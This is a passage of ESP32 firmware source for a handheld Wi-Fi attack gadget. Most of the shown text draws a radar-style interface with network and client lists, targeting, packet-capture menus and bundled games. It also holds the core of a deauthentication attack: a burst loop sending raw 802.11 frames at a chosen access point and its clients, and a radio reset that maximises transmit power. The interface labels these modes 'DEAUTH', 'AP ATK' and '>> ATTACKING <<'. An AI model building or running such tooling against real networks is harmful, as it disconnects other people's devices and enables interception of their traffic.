    uint16_t seq = seqNum + i;
    pktAP[i][22] = (seq & 0x0F) << 4;
    pktAP[i][23] = (seq >> 4) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, pktAP[i], PKT_SIZE, false);
    if (clientDeauthRunning) {
      pktCL[i][22] = ((seq+PKT_BURST) & 0x0F) << 4;
      pktCL[i][23] = ((seq+PKT_BURST) >> 4) & 0xFF;
      esp_wifi_80211_tx(WIFI_IF_AP, pktCL[i], PKT_SIZE, false);
    }
    delayMicroseconds(100);
  }
  seqNum += PKT_BURST;
  totalPackets += PKT_BURST * (clientDeauthRunning ? 2 : 1);
}

bool setChannel(int ch) {
  if (ch < 1 || ch > 13) ch = 1;
  return esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) == ESP_OK;
}

bool resetWiFiForDeauth() {
  if (btScanning) stopBTScan();
  if (btDeauthRunning) stopBTDeauth();
  if (pcap.isCapturing) stopPCAPCapture();
  
  if (snifferRunning) stopSniffer();
  WiFi.disconnect(true, true); delay(100);
  WiFi.mode(WIFI_OFF); delay(150);
  WiFi.mode(WIFI_AP);  delay(150);
  esp_wifi_set_max_tx_power(80);
  esp_wifi_set_ps(WIFI_PS_NONE);
  if (!setChannel(attackChannel)) return false;
  esp_wifi_set_promiscuous(false);
  silenceLogs(); return true;
}

void restoreWiFi() {
  esp_wifi_set_promiscuous(false); delay(100);
  WiFi.mode(WIFI_STA); delay(300); silenceLogs();
  if (storedNetworkCount > 0)
    connectToWiFiNetwork(storedNetworks[0].ssid, storedNetworks[0].password);
}

// ============================================================
//  RADAR FUNCTIONS
// ============================================================
void assignRadarPositions() {
  for (int i = 0; i < totalNetworks; i++) {
    float baseAngle = (360.0f / max(totalNetworks, 1)) * i;
    float jitter = ((networks[i].bssid[4]*7 + networks[i].bssid[5]*3) % 40) - 20.0f;
    netRadarAngle[i] = baseAngle + jitter;
    if (netRadarAngle[i] < 0)    netRadarAngle[i] += 360.0f;
    if (netRadarAngle[i] >= 360) netRadarAngle[i] -= 360.0f;
    float norm = (float)map(constrain(networks[i].rssi,-90,-30),-90,-30,90,20) / 100.0f;
    netRadarDist[i] = norm;
    netHitTime[i]   = 0;
  }
}

void drawSweepLine(float angleDeg, uint16_t col) {
  float rad = angleDeg * DEG_TO_RAD;
  for (int r = 1; r < RADAR_R; r++) {
    int px = RADAR_CX + (int)(cos(rad) * r);
    int py = RADAR_CY + (int)(sin(rad) * r);
    int dx = px - RADAR_CX, dy = py - RADAR_CY;
    if (dx*dx + dy*dy <= RADAR_R*RADAR_R)
      tft.drawPixel(px, py, col);
  }
}

void drawRadarBlip(int idx, float angleDeg, float distNorm, uint16_t col, bool big) {
  float rad = angleDeg * DEG_TO_RAD;
  int bx = RADAR_CX + (int)(cos(rad) * distNorm * RADAR_R);
  int by = RADAR_CY + (int)(sin(rad) * distNorm * RADAR_R);
  
  int dx = bx - RADAR_CX, dy = by - RADAR_CY;
  if (dx*dx + dy*dy <= RADAR_R*RADAR_R) {
    if (big) {
      tft.fillCircle(bx, by, 4, col);
      tft.drawCircle(bx, by, 6, col);
    } else {
      tft.fillCircle(bx, by, 3, col);
    }
  }
}

void drawRadarGrid() {
  tft.fillCircle(RADAR_CX, RADAR_CY, RADAR_R, C_BG);
  for (int r = RADAR_R/4; r <= RADAR_R; r += RADAR_R/4)
    tft.drawCircle(RADAR_CX, RADAR_CY, r, C_GREEN_DARK);
  tft.drawLine(RADAR_CX-RADAR_R, RADAR_CY, RADAR_CX+RADAR_R, RADAR_CY, C_GREEN_DARK);
  tft.drawLine(RADAR_CX, RADAR_CY-RADAR_R, RADAR_CX, RADAR_CY+RADAR_R, C_GREEN_DARK);
  int d = (int)(RADAR_R * 0.707f);
  tft.drawLine(RADAR_CX-d, RADAR_CY-d, RADAR_CX+d, RADAR_CY+d, C_GREEN_DARK);
  tft.drawLine(RADAR_CX+d, RADAR_CY-d, RADAR_CX-d, RADAR_CY+d, C_GREEN_DARK);
  tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_R,   C_GREEN);
  tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_R-1, C_GREEN_DIM);
}

void updateRadarSweep() {
  unsigned long now = millis();

  float eraseAngle = sweepAngle - 2.0f;
  if (eraseAngle < 0) eraseAngle += 360.0f;
  drawSweepLine(eraseAngle, C_BG);

  for (int t = 1; t <= TRAIL_STEPS; t++) {
    float ta = sweepAngle - t * (180.0f / TRAIL_STEPS);
    if (ta < 0) ta += 360.0f;
    uint16_t tc;
    if (t < TRAIL_STEPS/3)        tc = C_GREEN_DIM;
    else if (t < TRAIL_STEPS*2/3) tc = C_GREEN_DARK;
    else                           tc = C_GREEN_FADE;
    drawSweepLine(ta, tc);
  }

  drawSweepLine(sweepAngle, C_GREEN);

  for (int i = 0; i < totalNetworks; i++) {
    float diff = fabs(sweepAngle - netRadarAngle[i]);
    if (diff > 180) diff = 360 - diff;
    if (diff < SWEEP_SPEED + 1.0f) netHitTime[i] = now;
  }

  for (int i = 0; i < totalNetworks; i++) {
    if (netHitTime[i] == 0) continue;
    unsigned long age = now - netHitTime[i];
    bool isSel = (i == selectedNetworkIndex);
    bool isCur = (i == currentIndex);
    uint16_t col;
    if (deauthRunning && isSel)  col = (now/200 % 2) ? C_RED : C_ORANGE;
    else if (isSel)              col = C_RED;
    else if (isCur)              col = C_YELLOW;
    else if (age < 800)          col = C_GREEN;
    else if (age < 1800)         col = C_GREEN_DIM;
    else if (age < 3000)         col = C_GREEN_DARK;
    else continue;
    drawRadarBlip(i, netRadarAngle[i], netRadarDist[i], col, isSel||isCur);
  }

  tft.fillCircle(RADAR_CX, RADAR_CY, 3, C_GREEN);

  sweepAngle += SWEEP_SPEED;
  if (sweepAngle >= 360.0f) sweepAngle -= 360.0f;
}

void drawRadarPanelFrame() {
  tft.fillRect(RADAR_PANEL_X, RADAR_PANEL_Y, RADAR_PANEL_W, RADAR_PANEL_H, C_BG);

  tft.setTextSize(1);
  tft.setCursor(RADAR_PANEL_X + 4, RADAR_PANEL_Y + 4);
  
  if (deauthRunning) {
    tft.setTextColor(C_RED, C_BG); tft.print(">> ATTACKING <<");
  } else if (snifferRunning) {
    tft.setTextColor(C_GREEN, C_BG); 
    tft.print("SNIFFING");
    tft.setCursor(RADAR_PANEL_X + 90, RADAR_PANEL_Y + 4);
    tft.setTextColor(C_CYAN, C_BG);
    tft.print("[ISOLATED]");
    
    tft.setCursor(RADAR_PANEL_X + 4, RADAR_PANEL_Y + 18);
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.print("TARGET:");
    tft.setTextColor(C_WHITE, C_BG);
    tft.setCursor(RADAR_PANEL_X + 50, RADAR_PANEL_Y + 18);
    String shortSSID = sniffSSID.substring(0, 10);
    tft.print(shortSSID);
  } else if (isConnectedToNetwork) {
    tft.setTextColor(C_GREEN, C_BG); tft.print("ONLINE");
  } else {
    tft.setTextColor(C_GREEN_DARK, C_BG); tft.print("STANDBY");
  }

  tft.setCursor(RADAR_PANEL_X + RADAR_PANEL_W - 56, RADAR_PANEL_Y + 4);
  if (isConnectedToNetwork) {
    tft.setTextColor(C_GREEN, C_BG); tft.print("WiFi:ON ");
  } else {
    tft.setTextColor(C_GREEN_DARK, C_BG); tft.print("WiFi:OFF");
  }

  drawRadarGrid();

  if (selectedNetworkIndex >= 0) {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(RADAR_PANEL_X + 4, RADAR_PANEL_Y + RADAR_PANEL_H - 14);
    tft.printf("CH:%d  %s", networks[selectedNetworkIndex].channel,
      networks[selectedNetworkIndex].ssid.substring(0,12).c_str());
  }
  
  if (snifferRunning) {
    tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_R-5, C_CYAN);
  }
}

void updateAttackOverlay() {
  if (!deauthRunning) return;
  unsigned long rt = (millis() - attackStartTime) / 1000;
  int oy = RADAR_PANEL_Y + RADAR_PANEL_H - 22;
  tft.fillRect(RADAR_PANEL_X + 2, oy, RADAR_PANEL_W - 4, 16, C_BG);
  tft.setTextColor(C_RED, C_BG); tft.setTextSize(1);
  tft.setCursor(RADAR_PANEL_X + 6, oy + 4);
  tft.printf("PKT:%lu  %d/s  %02lu:%02lu", totalPackets, actualRate, rt/60, rt%60);
}

// ============================================================
//  LIST PANEL (WiFi)
// ============================================================
void drawSignalBars(int x, int y, int rssi) {
  int bars = 1;
  if (rssi > -80) bars = 2;
  if (rssi > -70) bars = 3;
  if (rssi > -60) bars = 4;
  if (rssi > -50) bars = 5;
  for (int b = 0; b < 5; b++) {
    int bx = x + b * 6;
    int bh = 4 + b * 2;
    int by = y + (10 - bh);
    if (b < bars) {
      tft.fillRect(bx, by, 4, bh, b >= 3 ? C_GREEN : C_GREEN_DIM);
    } else {
      tft.drawRect(bx, by, 4, bh, C_GREEN_DARK);
    }
  }
}

void drawListPanel() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W, LIST_H, C_BG);

  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(LIST_X + 6, LIST_Y + 6);
  tft.print("NETWORKS");
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(LIST_X + 190, LIST_Y + 6);
  tft.printf("%d", totalNetworks);
  tft.drawFastHLine(LIST_X, LIST_Y + LIST_HEADER_H, LIST_W, C_GREEN_DARK);

  if (totalNetworks == 0) {
    tft.setTextColor(C_GREEN_DARK, C_BG);
    tft.setCursor(LIST_X + 20, LIST_Y + 80); tft.print("[ NO NETWORKS ]");
    tft.setCursor(LIST_X + 20, LIST_Y + 100); tft.print("Press SCAN");
    tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
    return;
  }

  int startIdx = currentIndex - LIST_ROWS/2;
  if (startIdx < 0) startIdx = 0;
  if (startIdx > totalNetworks - LIST_ROWS) startIdx = max(0, totalNetworks - LIST_ROWS);

  for (int row = 0; row < LIST_ROWS && (startIdx+row) < totalNetworks; row++) {
    int ni = startIdx + row;
    int ry = LIST_Y + LIST_HEADER_H + 2 + row * LIST_ROW_H;
    bool isCurrent  = (ni == currentIndex);
    bool isSelected = (ni == selectedNetworkIndex);

    if (isCurrent)
      tft.fillRect(LIST_X, ry, LIST_W, LIST_ROW_H-1, C_GREEN_DARK);

    tft.setTextColor(isSelected ? C_RED : C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setTextSize(1);
    tft.setCursor(LIST_X + 4, ry + 8);
    tft.printf("%2d.", ni+1);

    String ssid = networks[ni].ssid;
    if (ssid.length() > 16) ssid = ssid.substring(0,15) + "~";
    uint16_t ssidCol;
    if      (isSelected && deauthRunning) ssidCol = C_RED;
    else if (isSelected)                  ssidCol = C_RED;
    else if (isCurrent)                   ssidCol = C_YELLOW;
    else                                  ssidCol = C_CYAN;
    tft.setTextColor(ssidCol, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(LIST_X + 26, ry + 8);
    tft.print(ssid);

    drawSignalBars(LIST_W - 34, ry + 6, networks[ni].rssi);
    tft.drawFastHLine(LIST_X, ry + LIST_ROW_H - 1, LIST_W, C_GREEN_DARK);
  }

  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
}

// ============================================================
//  CLIENT VIEW (WiFi)
// ============================================================
void displayClientView() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W, LIST_H, C_BG);

  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(LIST_X + 6, LIST_Y + 6);
  tft.print("CLIENTS");

  int clientCount;
  portENTER_CRITICAL(&snifferMux); 
  clientCount = totalClients; 
  portEXIT_CRITICAL(&snifferMux);

  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(LIST_X + 80, LIST_Y + 6);
  tft.printf("ISO:%s CNT:%d", snifferRunning?"ON":"OFF", clientCount);
  
  if (snifferRunning) {
    tft.setCursor(LIST_X + 6, LIST_Y + 16);
    tft.setTextColor(C_CYAN, C_BG);
    tft.print("NET: " + sniffSSID.substring(0, 14));
  }
  
  tft.drawFastHLine(LIST_X, LIST_Y + LIST_HEADER_H + 4, LIST_W, C_GREEN_DARK);

  if (clientCount == 0) {
    tft.setTextColor(C_GREEN_DARK, C_BG);
    tft.setCursor(LIST_X+10, LIST_Y+70); tft.print("NETWORK ISOLATION ACTIVE");
    tft.setTextColor(C_GREEN, C_BG);
    tft.setCursor(LIST_X+10, LIST_Y+90); tft.print("Only devices connected");
    tft.setCursor(LIST_X+10, LIST_Y+104); tft.print("to selected AP appear:");
    tft.setTextColor(C_YELLOW, C_BG);
    tft.setCursor(LIST_X+10, LIST_Y+124); 
    if (selectedNetworkIndex >= 0)
      tft.print(networks[selectedNetworkIndex].ssid.substring(0, 18));
    tft.setTextColor(C_GREEN_FADE, C_BG);
    tft.setCursor(LIST_X+10, LIST_Y+154); tft.print("Generate traffic to");
    tft.setCursor(LIST_X+10, LIST_Y+168); tft.print("discover clients");
    tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
    return;
  }

  if (clientViewIndex >= clientCount) clientViewIndex = clientCount - 1;

  portENTER_CRITICAL(&snifferMux);
  ClientInfo c = clients[clientViewIndex];
  bool isSel   = (clientViewIndex == selectedClientIdx);
  portEXIT_CRITICAL(&snifferMux);

  int y = LIST_Y + LIST_HEADER_H + 10;

  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(LIST_X+6, y);
  tft.printf("Client %d / %d", clientViewIndex+1, clientCount);
  if (isSel) { tft.setTextColor(C_RED, C_BG); tft.print("  [TARGET]"); }
  if (deauthRunning && isSel) { tft.setTextColor(C_RED, C_BG); tft.print(" ATK"); }
  y += 16;

  tft.drawFastHLine(LIST_X+4, y, LIST_W-8, C_GREEN_DARK); y += 6;

  tft.setTextColor(C_GREEN_DIM, C_BG); tft.setCursor(LIST_X+6, y); tft.print("MAC:"); y += 12;
  tft.setTextColor(isSel ? C_RED : C_GREEN, C_BG);
  tft.setCursor(LIST_X+6, y); tft.print(c.macStr); y += 16;

  tft.setTextColor(C_GREEN_DIM, C_BG); tft.setCursor(LIST_X+6, y); tft.print("RSSI: ");
  tft.setTextColor(sigColor(c.rssi), C_BG); tft.printf("%d dBm", c.rssi); y += 14;

  int barW = LIST_W - 20;
  tft.drawRect(LIST_X+6, y, barW, 8, C_GREEN_DARK);
  int filled = map(constrain(c.rssi,-90,-30),-90,-30,0,barW);
  tft.fillRect(LIST_X+6, y, filled, 8, sigColor(c.rssi)); y += 16;

  tft.setTextColor(C_GREEN_DIM, C_BG); tft.setCursor(LIST_X+6, y); tft.print("Pkts: ");
  tft.setTextColor(C_GREEN, C_BG); tft.print(c.pktCount); y += 16;

  tft.setTextColor(C_GREEN_DIM, C_BG); tft.setCursor(LIST_X+6, y); tft.print("Vendor: ");
  tft.setTextColor(C_CYAN, C_BG); 
  tft.print(getManufacturer(c.oui)); y += 16;

  tft.setTextColor(C_GREEN_DARK, C_BG); tft.setCursor(LIST_X+6, y);
  tft.printf("OUI: %02X:%02X:%02X", c.mac[0], c.mac[1], c.mac[2]); y += 20;

  if (deauthRunning && isSel) {
    unsigned long rt = (millis()-attackStartTime)/1000;
    tft.setTextColor(C_RED, C_BG); tft.setCursor(LIST_X+6, y);
    tft.printf("ATK %02lu:%02lu  %lu pkts", rt/60, rt%60, totalPackets);
  }

  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
}

// ============================================================
//  BUTTON FUNCTIONS
// ============================================================
void drawBtn(int x, int y, int w, const char* lbl, uint16_t col) {
  tft.fillRect(x, y, w, BTN_H, C_BG);
  tft.drawRect(x,   y,   w,   BTN_H,   col);
  tft.drawRect(x+1, y+1, w-2, BTN_H-2, C_GREEN_DARK);
  tft.setTextColor(col, C_BG); tft.setTextSize(1);
  int tx = x + (w - (int)strlen(lbl)*6) / 2;
  if (tx < x+2) tx = x+2;
  tft.setCursor(tx, y + (BTN_H-8)/2);
  tft.print(lbl);
}

void drawBtnPressed(int x, int y, int w, const char* lbl) {
  tft.fillRect(x, y, w, BTN_H, C_GREEN_DARK);
  tft.drawRect(x, y, w, BTN_H, C_GREEN);
  tft.setTextColor(C_GREEN, C_GREEN_DARK); tft.setTextSize(1);
  int tx = x + (w - (int)strlen(lbl)*6) / 2;
  if (tx < x+2) tx = x+2;
  tft.setCursor(tx, y + (BTN_H-8)/2);
  tft.print(lbl);
}

void drawButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   C_GREEN_DARK);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   C_GREEN_DARK);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "SEL",    selectedNetworkIndex>=0 ? C_GREEN : C_GREEN_DARK);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "DEAUTH", deauthRunning ? C_RED : C_GREEN_DARK);
  drawBtn(STOP_X,    BTN_Y, BTN_W, "STOP",   deauthRunning ? C_RED : C_GREEN_DARK);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "CONN",   isConnectedToNetwork ? C_GREEN : C_GREEN_DARK);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "CLIENT", selectedNetworkIndex>=0 ? C_GREEN_DIM : C_GREEN_DARK);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "SCAN",   C_GREEN);
}

void drawClientButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   C_GREEN_DARK);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   C_GREEN_DARK);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "SEL",    selectedClientIdx>=0 ? C_GREEN : C_GREEN_DARK);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "DEAUTH", deauthRunning ? C_RED : (selectedClientIdx>=0 ? C_ORANGE : C_GREEN_DARK));
  drawBtn(STOP_X,    BTN_Y, BTN_W, "STOP",   deauthRunning ? C_RED : C_GREEN_DARK);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "BACK",   C_GREEN_DARK);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "CLEAR",  C_GREEN_DARK);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "AP ATK", deauthRunning ? C_RED : C_GREEN_DARK);
}

// ============================================================
//  MESSAGE FUNCTIONS
// ============================================================
void showMessage(String msg, int dur) {
  tft.fillRect(LIST_X, LIST_Y, LIST_W, LIST_H, C_BG);
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
  int tw = msg.length() * 6;
  int x  = max(LIST_X+4, (LIST_W - tw) / 2);
  tft.setCursor(x, LIST_Y + LIST_H/2 - 4);
  tft.print(msg);
  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
  if (dur > 0) delay(dur);
}

void showIsolationMessage(String ssid) {
  tft.fillRect(LIST_X, LIST_Y, LIST_W, LIST_H, C_BG);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(1);
  
  int y = LIST_Y + 40;
  tft.setCursor(LIST_X + 20, y); tft.print("╔══════════════════╗"); y += 16;
  tft.setCursor(LIST_X + 20, y); tft.print("║ NETWORK ISOLATION ║"); y += 16;
  tft.setCursor(LIST_X + 20, y); tft.print("║     ACTIVE        ║"); y += 16;
  tft.setCursor(LIST_X + 20, y); tft.print("╚══════════════════╝"); y += 20;
  
  tft.setTextColor(C_GREEN, C_BG);
  tft.setCursor(LIST_X + 10, y); tft.print("Selected Network:"); y += 16;
  tft.setTextColor(C_YELLOW, C_BG);
  tft.setCursor(LIST_X + 10, y); tft.print(ssid.substring(0, 20)); y += 20;
  
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(LIST_X + 10, y); tft.print("Only clients from");
  y += 14;
  tft.setCursor(LIST_X + 10, y); tft.print("this network will");
  y += 14;
  tft.setCursor(LIST_X + 10, y); tft.print("appear in client view");
  
  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
  delay(2000);
}

// ============================================================
//  TOUCH HANDLERS
// ============================================================
void handleMainMenuTouch(uint16_t x, uint16_t y) {
  if (y >= BTN_Y && y <= BTN_Y + BTN_H) {
    if (x >= HOME_X && x < HOME_X + BTN_W) {
      drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
      delay(120);
      return;
    }
  }
  
  int menuX = (SCREEN_W - 360) / 2;
  int menuW = 360;
  
  if (x >= menuX && x <= menuX + menuW) {
    if (y >= 40 && y <= 90) {
      showMessage("Loading WiFi Tool...", 500);
      currentMode = MODE_WIFI_DEAUTH;
      tft.fillScreen(C_BG);
      drawRadarPanelFrame();
      drawListPanel();
      drawButtons();
      scanNetworks();
    }
    else if (y >= 100 && y <= 150) {
      showMessage("Loading Bluetooth Scanner...", 500);
      currentMode = MODE_BT_SCANNER;
      tft.fillScreen(C_BG);
      displayBTScanner();
      drawBTButtons();
    }
    else if (y >= 160 && y <= 210) {
      showMessage("Loading PCAP Capture...", 500);
      currentMode = MODE_PCAP_CAPTURE;
      tft.fillScreen(C_BG);
      
      pcap.maxFileSize = 10 * 1024 * 1024;
      pcap.maxPackets = 10000;
      pcap.captureDuration = 0;
      pcap.filterByNetwork = false;
      pcap.filterByDevice = false;
      pcap.packetListIndex = 0;
      
      initSDCard();
      
      displayPCAPView();
      drawPCAPButtons();
    }
    else if (y >= 220 && y <= 270) {
      showMessage("Loading Games Menu...", 500);
      currentMode = MODE_GAMES_MENU;
      tft.fillScreen(C_BG);
      drawGamesMenu();
      drawGamesMenuButtons();
    }
  }
}

void handleGamesMenuTouch(uint16_t x, uint16_t y) {
  if (y >= BTN_Y && y <= BTN_Y + BTN_H) {
    if (x >= HOME_X && x < HOME_X + BTN_W) {
      drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
      delay(120);
      currentMode = MODE_MAIN_MENU;
      tft.fillScreen(C_BG);
      drawMainMenu();
      drawMainMenuButtons();
      return;
    }
  }
  
  int menuX = (SCREEN_W - 360) / 2;
  int menuW = 360;
  
  if (x >= menuX && x <= menuX + menuW) {
    if (y >= 70 && y <= 140) {
      showMessage("Loading Galaga...", 500);
      currentMode = MODE_GALAGA;
      tft.fillScreen(C_BG);
      initGalaga();
      drawGalaga();
      drawGalagaButtons();
    }
    else if (y >= 160 && y <= 230) {
      showMessage("Loading Tetris...", 500);
      currentMode = MODE_TETRIS;
      tft.fillScreen(C_BG);
      initTetris();
      drawTetris();
      drawTetrisButtons();
    }
    else if (y >= 250 && y <= 300) {
      currentMode = MODE_MAIN_MENU;
      tft.fillScreen(C_BG);
      drawMainMenu();
      drawMainMenuButtons();
    }
  }
}

void handlePacketViewTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    exitPacketView();
    return;
  }
  
  if (x >= PREV_X && x < PREV_X + BTN_W) {
    drawBtnPressed(PREV_X, BTN_Y, BTN_W, "PREV");
    delay(120);
    if(pcap.viewedPacketIndex >= 8) {
      pcap.viewedPacketIndex -= 8;
      displayPacketView();
      drawPacketViewButtons();
    }
  }
  else if (x >= NEXT_X && x < NEXT_X + BTN_W) {
    drawBtnPressed(NEXT_X, BTN_Y, BTN_W, "NEXT");
    delay(120);
    if(pcap.viewedPacketIndex + 8 < pcap.packetListIndex) {
      pcap.viewedPacketIndex += 8;
      displayPacketView();
      drawPacketViewButtons();
    }
  }
  else if (x >= SEL_X && x < SEL_X + BTN_W) {
    drawBtnPressed(SEL_X, BTN_Y, BTN_W, "TOP");
    delay(120);
    pcap.viewedPacketIndex = 0;
    displayPacketView();
    drawPacketViewButtons();
  }
  else if (x >= DEAUTH_X && x < DEAUTH_X + BTN_W) {
    drawBtnPressed(DEAUTH_X, BTN_Y, BTN_W, "BOTTOM");
    delay(120);
    if(pcap.packetListIndex > 8) {
      pcap.viewedPacketIndex = ((pcap.packetListIndex - 1) / 8) * 8;
      displayPacketView();
      drawPacketViewButtons();
    }
  }
  else if (x >= STOP_X && x < STOP_X + BTN_W) {
    drawBtnPressed(STOP_X, BTN_Y, BTN_W, "BACK");
    delay(120);
    exitPacketView();
  }
}

void handlePCAPScanTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    if (pcapSnifferRunning) pcapStopClientSniffer();
    if (pcap.isCapturing) stopPCAPCapture();
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if (x >= PREV_X && x < PREV_X + BTN_W) {
    drawBtnPressed(PREV_X, BTN_Y, BTN_W, "PREV");
    delay(120);
    pcapPrevNetwork();
    drawPCAPScanButtons();
  }
  else if (x >= NEXT_X && x < NEXT_X + BTN_W) {
    drawBtnPressed(NEXT_X, BTN_Y, BTN_W, "NEXT");
    delay(120);
    pcapNextNetwork();
    drawPCAPScanButtons();
  }
  else if (x >= SEL_X && x < SEL_X + BTN_W) {
    drawBtnPressed(SEL_X, BTN_Y, BTN_W, "SELECT");
    delay(120);
    pcapSelectNetwork();
    drawPCAPScanButtons();
  }
  else if (x >= DEAUTH_X && x < DEAUTH_X + BTN_W) {
    drawBtnPressed(DEAUTH_X, BTN_Y, BTN_W, "SNIFF");
    delay(120);
    pcapStartClientSniffer();
  }
  else if (x >= STOP_X && x < STOP_X + BTN_W) {
    drawBtnPressed(STOP_X, BTN_Y, BTN_W, "BACK");
    delay(120);
    currentMode = MODE_PCAP_CAPTURE;
    tft.fillScreen(C_BG);
    displayPCAPView();
    drawPCAPButtons();
  }
  else if (x >= CONN_X && x < CONN_X + BTN_W) {
    drawBtnPressed(CONN_X, BTN_Y, BTN_W, "SCAN");
    delay(120);
    pcapScanNetworks();
  }
}

void handlePCAPClientTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    pcapStopClientSniffer();
    if (pcap.isCapturing) stopPCAPCapture();
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if (x >= PREV_X && x < PREV_X + BTN_W) {
    drawBtnPressed(PREV_X, BTN_Y, BTN_W, "PREV");
    delay(120);
    pcapPrevClient();
    drawPCAPClientButtons();
  }
  else if (x >= NEXT_X && x < NEXT_X + BTN_W) {
    drawBtnPressed(NEXT_X, BTN_Y, BTN_W, "NEXT");
    delay(120);
    pcapNextClient();
    drawPCAPClientButtons();
  }
  else if (x >= SEL_X && x < SEL_X + BTN_W) {
    drawBtnPressed(SEL_X, BTN_Y, BTN_W, "SELECT");
    delay(120);
    pcapSelectClient();
  }
  else if (x >= DEAUTH_X && x < DEAUTH_X + BTN_W) {
    drawBtnPressed(DEAUTH_X, BTN_Y, BTN_W, "TARGET");
    delay(120);
    if (pcapSelectedClientIndex >= 0) {
      selectPCAPClient();
      currentMode = MODE_PCAP_CAPTURE;
      tft.fillScreen(C_BG);
      displayPCAPView();
      drawPCAPButtons();
      showMessage("Target set for capture", 1500);
    } else {
      showMessage("Select client first!", 1000);
    }
  }
  else if (x >= STOP_X && x < STOP_X + BTN_W) {
    drawBtnPressed(STOP_X, BTN_Y, BTN_W, "STOP");
    delay(120);
    pcapStopClientSniffer();
    currentMode = MODE_PCAP_SCAN_VIEW;
    tft.fillScreen(C_BG);
    displayPCAPScanView();
    drawPCAPScanButtons();
  }
  else if (x >= CONN_X && x < CONN_X + BTN_W) {
    drawBtnPressed(CONN_X, BTN_Y, BTN_W, "SCAN");
    delay(120);
    pcapStopClientSniffer();
    currentMode = MODE_PCAP_SCAN_VIEW;
    tft.fillScreen(C_BG);
    pcapScanNetworks();
    drawPCAPScanButtons();
  }
  else if (x >= CLIENT_X && x < CLIENT_X + BTN_W) {
    drawBtnPressed(CLIENT_X, BTN_Y, BTN_W, "CLEAR");
    delay(120);
    portENTER_CRITICAL(&pcapSnifferMux);
    pcapTotalClients = 0;
    pcapSelectedClientIndex = -1;
    pcapCurrentClientIndex = 0;
    portEXIT_CRITICAL(&pcapSnifferMux);
    displayPCAPClientView();
    drawPCAPClientButtons();
    showMessage("Client list cleared", 1000);
  }
}

void handlePCAPTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    if (pcap.isCapturing) stopPCAPCapture();
    if (pcapSnifferRunning) pcapStopClientSniffer();
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if (x >= PREV_X && x < PREV_X + BTN_W) {
    drawBtnPressed(PREV_X, BTN_Y, BTN_W, "LIST");
    delay(120);
